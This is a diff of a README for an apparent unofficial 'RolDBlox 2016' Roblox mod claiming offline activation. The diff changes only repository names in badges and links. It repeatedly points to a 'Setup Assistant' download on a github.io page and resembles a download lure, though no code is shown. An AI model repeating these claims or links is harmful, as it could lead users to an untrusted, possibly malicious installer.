@@ -1,10 +1,10 @@
 # RolDBlox 2016 Mod — Offline Roblox Legacy Engine Activation
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download.svg)](https://github.com/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download/stargazers)
+[![GitHub stars](https://img.shields.io/github/stars/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download.svg)](https://github.com/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download/stargazers)
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://roblox-roldblox-mod-2016-download.github.io/.github)
-[![GitHub release](https://img.shields.io/github/release/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download.svg)](https://github.com/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://github.com/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download)
+[![GitHub release](https://img.shields.io/github/release/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download.svg)](https://github.com/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://github.com/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download)
 
 > **Unlock the classic 2016 Roblox experience with offline activation!** 
 > Complete legacy engine features, classic UI themes, and private server hosting without internet connection.
@@ -117,10 +117,10 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🔗 Important Links
 
 - [📥 Download Setup Assistant](https://roblox-roldblox-mod-2016-download.github.io/.github)
-- [📖 Full Documentation](https://roblox-roldblox-mod-2016-download.github.io/)
-- [🐛 Report Issues](https://github.com/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download/issues)
-- [💬 Community Discussions](https://github.com/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download/discussions)
-- [📋 Project Roadmap](https://github.com/roblox-roldblox-mod-2016-download/roblox-roldblox-mod-2016-download/projects)
+- [📖 Full Documentation](https://roblox-roldblox-mod-2016-download.github.io/Roblox-Offline-Guide-Download/)
+- [🐛 Report Issues](https://github.com/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download/issues)
+- [💬 Community Discussions](https://github.com/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download/discussions)
+- [📋 Project Roadmap](https://github.com/roblox-roldblox-mod-2016-download/Roblox-Offline-Guide-Download/projects)
 
 ## 🏷️ Keywords
 
